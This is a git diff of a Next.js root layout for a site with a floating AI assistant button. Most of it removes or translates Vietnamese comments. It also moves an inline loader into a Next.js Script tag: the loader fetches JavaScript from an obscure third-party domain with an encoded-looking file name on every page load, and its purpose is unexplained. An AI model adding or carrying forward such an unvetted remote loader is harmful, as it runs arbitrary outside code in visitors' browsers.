@@ -10,13 +10,11 @@ export default function RootLayout({ children }) {
   const [isSpeaking, setIsSpeaking] = useState(false);
 
   useEffect(() => {
-    // Hàm kiểm tra trạng thái âm thanh từ cả hệ thống và localStorage
     const checkStatus = () => {
       if (typeof window !== 'undefined') {
         const synthSpeaking = window.speechSynthesis.speaking;
         const storageSpeaking = localStorage.getItem('ai_speaking') === 'true';
         
-        // Nếu trình duyệt đang đọc hoặc cờ storage đang bật
         if (synthSpeaking || storageSpeaking) {
           setIsSpeaking(true);
         } else {
@@ -25,10 +23,7 @@ export default function RootLayout({ children }) {
       }
     };
 
-    // Kiểm tra liên tục mỗi 300ms để đảm bảo nút hiện/ẩn nhạy bén
     const interval = setInterval(checkStatus, 300);
-
-    // Lắng nghe sự kiện thay đổi storage từ các tab/trang khác
     window.addEventListener('storage', checkStatus);
     
     return () => {
@@ -41,7 +36,7 @@ export default function RootLayout({ children }) {
     e.preventDefault();
     if (typeof window !== 'undefined') {
       window.speechSynthesis.cancel();
-      localStorage.setItem('ai_speaking', 'false'); // Hạ cờ ngay lập tức
+      localStorage.setItem('ai_speaking', 'false');
       setIsSpeaking(false);
     }
   };
@@ -49,18 +44,20 @@ export default function RootLayout({ children }) {
   return (
     <html lang="en">
       <head>
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function () {
-                  var script = document.createElement("script");
-                  script.async = 1;
-                  script.src = 'https://emrldtp.com/NDgwNzQz.js?t=480743';
-                  document.head.appendChild(script);
-              })();
-            `,
-          }}
-        />
+        {/* Fix for external images not displaying on localhost */}
+        <meta name="referrer" content="no-referrer" />
+        
+        {/* Dynamic script loading using Next.js Strategy */}
+        <Script id="external-script" strategy="lazyOnload">
+          {`
+            (function () {
+                var script = document.createElement("script");
+                script.async = 1;
+                script.src = 'https://emrldtp.com/NDgwNzQz.js?t=480743';
+                document.head.appendChild(script);
+            })();
+          `}
+        </Script>
       </head>
 
       <body className="min-h-screen bg-gray-50 text-gray-900 antialiased relative">
@@ -79,13 +76,13 @@ export default function RootLayout({ children }) {
           <main className="flex-1">{children}</main>
         </div>
 
-        {/* Cấu trúc nút nổi cố định */}
+        {/* Floating Action Button Container */}
         <div style={{ 
           position: 'fixed', bottom: '30px', right: '30px', zIndex: 10000, 
           display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '12px' 
         }}>
           
-          {/* NÚT STOP: Xuất hiện dựa trên trạng thái isSpeaking */}
+          {/* Audio Stop Button */}
           {isSpeaking && (
             <button 
               onClick={handleStopAudio}
@@ -101,7 +98,7 @@ export default function RootLayout({ children }) {
             </button>
           )}
 
-          {/* NÚT ROBOT CHÍNH */}
+          {/* Main AI Assistant Button */}
           <div style={{ position: 'relative', display: 'flex', alignItems: 'center' }}>
             <span className="label-popup" style={{
               marginRight: '15px', backgroundColor: 'white', padding: '8px 15px',
